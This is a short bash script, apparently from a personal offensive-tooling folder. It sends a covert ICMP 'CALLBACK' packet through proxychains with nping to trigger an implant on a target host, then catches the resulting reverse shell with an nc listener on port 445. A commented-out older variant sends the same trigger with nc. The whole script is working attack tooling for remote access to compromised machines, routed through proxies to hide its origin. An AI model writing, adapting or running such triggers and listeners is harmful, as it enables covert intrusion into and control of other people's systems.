#!/usr/bin/env bash

. /home/${USER}/Documents/scripts/linux/lib-cecho.sh

if [ $# -ne 1 ]; then
	cecho warning "Usage: $(basename $0) <ip_address>"
	exit 1
fi


REMOTE_IP="$1"
#REMOTE_PORT="$2"

LOCAL_IP=$(ip address show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
LOCAL_PORT=445


cecho task "Requesting callback (sleeping 1 second)"

# Old method using open ports
#(sleep 1 && echo -n "CALLBACK${LOCAL_IP}:${LOCAL_PORT}CALLBACK" | proxychains -q nc -w1 -vn ${REMOTE_IP} ${REMOTE_PORT}) &

# Newer method using a custom ICMP payload, no open ports necessary
# Send 'CALLBACK<ip>:<port>CALLBACK' to target to initiate reverse shell
(sleep 1 && proxychains -q sudo nping --icmp -c 1 --data-string "CALLBACK${LOCAL_IP}:${LOCAL_PORT}CALLBACK" ${REMOTE_IP} 2>/dev/null 1>&2) &

rlwrap nc -lvnp ${LOCAL_PORT}

cecho done "Callback session terminated"
